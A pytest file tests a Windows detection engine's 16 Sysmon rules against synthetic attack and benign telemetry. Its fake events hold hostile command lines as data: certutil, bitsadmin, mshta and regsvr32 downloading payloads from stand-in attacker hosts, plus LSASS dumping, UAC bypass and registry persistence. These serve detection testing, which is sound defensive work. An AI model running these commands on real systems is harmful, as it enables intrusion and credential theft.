"""Ground-truth evaluation matrix and synthetic telemetry fixtures for WinSentinel rules.

Tests 100% true-positive accuracy against synthetic attack telemetry across all 16
Sysmon core rules and 0% false-positive accuracy against benign administrative baselines.
"""

from __future__ import annotations

import hashlib
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import pytest

from app.detection.engine import DetectionEngine
from app.detection.loader import RuleLoader
from app.models.events import EventCategory, NormalizedEvent

RULES_DIR = Path(__file__).resolve().parent.parent.parent / "rules" / "sysmon"


@pytest.fixture(scope="module")
def detection_engine() -> DetectionEngine:
    """Initialize DetectionEngine with all 16 core Sysmon rules."""
    loader = RuleLoader()
    rules = loader.load_rules_from_directory(RULES_DIR, recursive=True, strict=True)
    assert len(rules) == 16
    engine = DetectionEngine()
    engine.load_rules(rules)
    return engine


def make_sysmon_event(
    event_id: int,
    category: EventCategory = EventCategory.PROCESS,
    event_type: str = "process_create",
    computer: str = "WIN-SERVER-01",
    user: str = r"CONTOSO\analyst",
    image: str | None = None,
    command_line: str | None = None,
    parent_image: str | None = None,
    parent_command_line: str | None = None,
    target_image: str | None = None,
    granted_access: str | None = None,
    call_trace: str | None = None,
    image_loaded: str | None = None,
    signed: str | None = None,
    signature_status: str | None = None,
    registry_target_object: str | None = None,
    registry_details: str | None = None,
    query_name: str | None = None,
    extra_fields: dict[str, Any] | None = None,
) -> NormalizedEvent:
    """Helper to synthesize NormalizedEvent objects for test assertions."""
    payload = f"synthetic-{event_id}-{image}-{command_line}-{target_image}-{query_name}"
    event_hash = hashlib.sha256(payload.encode()).hexdigest()

    return NormalizedEvent(
        event_id=event_id,
        record_id=1001,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer=computer,
        timestamp=datetime.now(timezone.utc),
        event_category=category,
        event_type=event_type,
        user=user,
        process_guid="{00000000-0000-0000-0000-000000000001}",
        process_id=4242,
        image=image,
        command_line=command_line,
        parent_process_guid="{00000000-0000-0000-0000-000000000002}",
        parent_process_id=1212,
        parent_image=parent_image,
        parent_command_line=parent_command_line,
        target_image=target_image,
        granted_access=granted_access,
        call_trace=call_trace,
        image_loaded=image_loaded,
        signed=signed,
        signature_status=signature_status,
        registry_target_object=registry_target_object,
        registry_details=registry_details,
        query_name=query_name,
        extra_fields=extra_fields or {},
        raw_payload=payload,
        event_hash=event_hash,
    )


# ==============================================================================
# Positive Attack Telemetry Tests (WS-SYS-001 through WS-SYS-016)
# ==============================================================================


def test_ws_sys_001_certutil_download(detection_engine: DetectionEngine) -> None:
    """WS-SYS-001: Suspicious Certutil Download."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\certutil.exe",
        command_line=r"certutil.exe -urlcache -split -f http://attacker.com/beacon.exe C:\Temp\beacon.exe",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-001"
    assert m.severity == "high"
    assert "T1105" in m.mitre_techniques
    assert len(m.matched_evidence) > 0
    assert "certutil" in m.explanation.lower()


def test_ws_sys_002_mshta_remote(detection_engine: DetectionEngine) -> None:
    """WS-SYS-002: Suspicious Mshta Remote Execution."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\mshta.exe",
        command_line=r"mshta.exe http://attacker.com/malicious.hta",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-002"
    assert m.severity == "high"
    assert "T1218.005" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_003_bitsadmin_download(detection_engine: DetectionEngine) -> None:
    """WS-SYS-003: BITSAdmin Job Download."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\bitsadmin.exe",
        command_line=r"bitsadmin.exe /transfer testJob /download /priority normal http://c2.evil/dropper.dll C:\Users\Public\dropper.dll",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-003"
    assert m.severity == "medium"
    assert "T1197" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_004_uac_bypass_fodhelper(detection_engine: DetectionEngine) -> None:
    """WS-SYS-004: UAC Bypass via Fodhelper."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        parent_image=r"C:\Windows\System32\fodhelper.exe",
        image=r"C:\Windows\System32\cmd.exe",
        command_line=r"cmd.exe /k echo Elevated",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-004"
    assert m.severity == "high"
    assert "T1548.002" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_005_rundll32_suspicious(detection_engine: DetectionEngine) -> None:
    """WS-SYS-005: Rundll32 Suspicious Execution."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\rundll32.exe",
        command_line=r"rundll32.exe C:\Users\Public\payload.dll,DllRegisterServer",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-005"
    assert m.severity == "medium"
    assert "T1218.011" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_006_whoami_recon(detection_engine: DetectionEngine) -> None:
    """WS-SYS-006: Whoami Reconnaissance."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\whoami.exe",
        command_line=r"whoami.exe /priv",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-006"
    assert m.severity == "low"
    assert "T1033" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_007_regsvr32_squiblydoo(detection_engine: DetectionEngine) -> None:
    """WS-SYS-007: Regsvr32 Squiblydoo Remote Script."""
    event = make_sysmon_event(
        event_id=1,
        category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\regsvr32.exe",
        command_line=r"regsvr32.exe /s /u /i:http://evil.site/payload.sct scrobj.dll",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-007"
    assert m.severity == "high"
    assert "T1218.010" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_008_remote_thread_lsass(detection_engine: DetectionEngine) -> None:
    """WS-SYS-008: Remote Thread Injection into LSASS."""
    event = make_sysmon_event(
        event_id=8,
        category=EventCategory.REMOTE_THREAD,
        event_type="create_remote_thread",
        image=r"C:\Users\Public\injector.exe",
        target_image=r"C:\Windows\System32\lsass.exe",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-008"
    assert m.severity == "critical"
    assert "T1055" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_009_remote_thread_sensitive_process(detection_engine: DetectionEngine) -> None:
    """WS-SYS-009: Remote Thread into Sensitive Process."""
    event = make_sysmon_event(
        event_id=8,
        category=EventCategory.REMOTE_THREAD,
        event_type="create_remote_thread",
        image=r"C:\AppData\Local\Temp\evil_helper.exe",
        target_image=r"C:\Windows\explorer.exe",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-009"
    assert m.severity == "high"
    assert "T1055.001" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_010_lsass_suspicious_access(detection_engine: DetectionEngine) -> None:
    """WS-SYS-010: Suspicious LSASS GrantedAccess."""
    event = make_sysmon_event(
        event_id=10,
        category=EventCategory.PROCESS_ACCESS,
        event_type="process_access",
        image=r"C:\Tools\dumper.exe",
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1F0FFF",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-010"
    assert m.severity == "high"
    assert "T1003.001" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_011_lsass_mimikatz_call_trace(detection_engine: DetectionEngine) -> None:
    """WS-SYS-011: Mimikatz Sekurlsa Call Trace."""
    event = make_sysmon_event(
        event_id=10,
        category=EventCategory.PROCESS_ACCESS,
        event_type="process_access",
        image=r"C:\Tools\mimikatz.exe",
        target_image=r"C:\Windows\System32\lsass.exe",
        call_trace=r"C:\Windows\SYSTEM32\ntdll.dll+9d414|C:\Windows\System32\KERNELBASE.dll+2bc7e|C:\Tools\sekurlsa.dll+1234",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-011"
    assert m.severity == "critical"
    assert "T1003.001" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_012_unsigned_driver_loaded(detection_engine: DetectionEngine) -> None:
    """WS-SYS-012: Unsigned or Untrusted Driver Loaded."""
    # Test unsigned condition
    event1 = make_sysmon_event(
        event_id=6,
        category=EventCategory.DRIVER,
        event_type="driver_load",
        image_loaded=r"C:\Windows\System32\drivers\rootkit.sys",
        signed="false",
        signature_status="untrusted",
    )
    matches1 = detection_engine.evaluate_event(event1)
    assert len(matches1) == 1
    assert matches1[0].rule_id == "WS-SYS-012"
    assert matches1[0].severity == "high"
    assert "T1068" in matches1[0].mitre_techniques

    # Test revoked condition
    event2 = make_sysmon_event(
        event_id=6,
        category=EventCategory.DRIVER,
        event_type="driver_load",
        image_loaded=r"C:\Windows\System32\drivers\byovd.sys",
        signed="true",
        signature_status="Revoked certificate",
    )
    matches2 = detection_engine.evaluate_event(event2)
    assert len(matches2) == 1
    assert matches2[0].rule_id == "WS-SYS-012"


def test_ws_sys_013_dll_loaded_from_temp(detection_engine: DetectionEngine) -> None:
    """WS-SYS-013: DLL Loaded from Temp Directory."""
    event = make_sysmon_event(
        event_id=7,
        category=EventCategory.IMAGE_LOAD,
        event_type="image_load",
        image=r"C:\Windows\explorer.exe",
        image_loaded=r"C:\AppData\Local\Temp\dropped_side_load.dll",
        signed="false",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-013"
    assert m.severity == "medium"
    assert "T1574.002" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_014_registry_run_key_persistence(detection_engine: DetectionEngine) -> None:
    """WS-SYS-014: Registry Run Key Persistence."""
    # Test Sysmon EID 12
    event12 = make_sysmon_event(
        event_id=12,
        category=EventCategory.REGISTRY,
        event_type="registry_event",
        image=r"C:\Users\Public\backdoor.exe",
        registry_target_object=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilBackdoor",
        registry_details=r"C:\Users\Public\backdoor.exe",
    )
    matches12 = detection_engine.evaluate_event(event12)
    assert len(matches12) == 1
    assert matches12[0].rule_id == "WS-SYS-014"

    # Test Sysmon EID 13
    event13 = make_sysmon_event(
        event_id=13,
        category=EventCategory.REGISTRY,
        event_type="registry_event",
        image=r"C:\Windows\System32\reg.exe",
        registry_target_object=r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Update",
    )
    matches13 = detection_engine.evaluate_event(event13)
    assert len(matches13) == 1
    assert matches13[0].rule_id == "WS-SYS-014"
    assert matches13[0].severity == "medium"
    assert "T1547.001" in matches13[0].mitre_techniques


def test_ws_sys_015_ifeo_debugger_persistence(detection_engine: DetectionEngine) -> None:
    """WS-SYS-015: IFEO Debugger Persistence."""
    event = make_sysmon_event(
        event_id=12,
        category=EventCategory.REGISTRY,
        event_type="registry_event",
        image=r"C:\Windows\System32\reg.exe",
        registry_target_object=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\Debugger",
        registry_details=r"C:\Windows\System32\cmd.exe",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-015"
    assert m.severity == "high"
    assert "T1546.012" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


def test_ws_sys_016_suspicious_dynamic_dns(detection_engine: DetectionEngine) -> None:
    """WS-SYS-016: Suspicious Dynamic DNS Query."""
    event = make_sysmon_event(
        event_id=22,
        category=EventCategory.DNS,
        event_type="dns_query",
        image=r"C:\Windows\System32\svchost.exe",
        query_name="covertc2channel.duckdns.org",
    )
    matches = detection_engine.evaluate_event(event)
    assert len(matches) == 1
    m = matches[0]
    assert m.rule_id == "WS-SYS-016"
    assert m.severity == "medium"
    assert "T1071.004" in m.mitre_techniques
    assert len(m.matched_evidence) > 0


# ==============================================================================
# False Positive Baseline Suppression Tests (0% False-Positive Rate)
# ==============================================================================


def test_benign_administrative_baselines_suppressed(detection_engine: DetectionEngine) -> None:
    """Verify that benign administrative baselines and exclusion filters trigger 0 alerts."""

    benign_scenarios = [
        # Benign certutil verification
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -verify certificate.cer",
        ),
        # Benign mshta local application
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\mshta.exe",
            command_line=r"mshta.exe C:\Program Files\EnterpriseApp\ui.hta",
        ),
        # Benign bitsadmin list jobs
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line=r"bitsadmin.exe /list /allusers",
        ),
        # Benign fodhelper spawning non-shell tool
        make_sysmon_event(
            event_id=1,
            parent_image=r"C:\Windows\System32\fodhelper.exe",
            image=r"C:\Windows\System32\control.exe",
            command_line=r"control.exe",
        ),
        # Benign rundll32 standard control panel
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        ),
        # Benign whoami standard invocation
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\whoami.exe",
            command_line=r"whoami.exe",
        ),
        # Benign regsvr32 normal DLL registration
        make_sysmon_event(
            event_id=1,
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line=r"regsvr32.exe /s C:\Windows\System32\vbscript.dll",
        ),
        # Benign csrss remote thread in lsass (exclusion filter in WS-SYS-008)
        make_sysmon_event(
            event_id=8,
            category=EventCategory.REMOTE_THREAD,
            image=r"C:\Windows\System32\csrss.exe",
            target_image=r"C:\Windows\System32\lsass.exe",
        ),
        # Benign remote thread in explorer from System32 (not Temp/Public)
        make_sysmon_event(
            event_id=8,
            category=EventCategory.REMOTE_THREAD,
            image=r"C:\Windows\System32\svchost.exe",
            target_image=r"C:\Windows\explorer.exe",
        ),
        # Benign svchost inspecting lsass (exclusion filter in WS-SYS-010)
        make_sysmon_event(
            event_id=10,
            category=EventCategory.PROCESS_ACCESS,
            image=r"C:\Windows\System32\svchost.exe",
            target_image=r"C:\Windows\System32\lsass.exe",
            granted_access="0x1410",
        ),
        # Benign taskmgr inspecting lsass (exclusion filter in WS-SYS-010)
        make_sysmon_event(
            event_id=10,
            category=EventCategory.PROCESS_ACCESS,
            image=r"C:\Windows\System32\taskmgr.exe",
            target_image=r"C:\Windows\System32\lsass.exe",
            granted_access="0x1010",
        ),
        # Benign normal lsass call trace without sekurlsa or dbghelp
        make_sysmon_event(
            event_id=10,
            category=EventCategory.PROCESS_ACCESS,
            image=r"C:\Windows\System32\lsass.exe",
            target_image=r"C:\Windows\System32\lsass.exe",
            call_trace=r"C:\Windows\SYSTEM32\ntdll.dll+9d414|C:\Windows\System32\kernel32.dll+1234",
        ),
        # Benign valid signed driver load
        make_sysmon_event(
            event_id=6,
            category=EventCategory.DRIVER,
            image_loaded=r"C:\Windows\System32\drivers\ntfs.sys",
            signed="true",
            signature_status="Valid",
        ),
        # Benign signed DLL loaded from Temp (exclusion filter in WS-SYS-013)
        make_sysmon_event(
            event_id=7,
            category=EventCategory.IMAGE_LOAD,
            image_loaded=r"C:\AppData\Local\Temp\SignedInstallerHelper.dll",
            signed="true",
        ),
        # Benign OneDrive updater modifying Run key (exclusion filter in WS-SYS-014)
        make_sysmon_event(
            event_id=13,
            category=EventCategory.REGISTRY,
            image=r"C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe",
            registry_target_object=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
        ),
        # Benign registry key modification not touching Run or IFEO
        make_sysmon_event(
            event_id=12,
            category=EventCategory.REGISTRY,
            image=r"C:\Windows\System32\reg.exe",
            registry_target_object=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate",
        ),
        # Benign standard DNS query
        make_sysmon_event(
            event_id=22,
            category=EventCategory.DNS,
            query_name="www.microsoft.com",
        ),
    ]

    for idx, benign_event in enumerate(benign_scenarios):
        matches = detection_engine.evaluate_event(benign_event)
        assert len(matches) == 0, (
            f"Benign scenario index {idx} triggered unexpected alert(s): "
            f"{[m.rule_id for m in matches]} for event {benign_event}"
        )
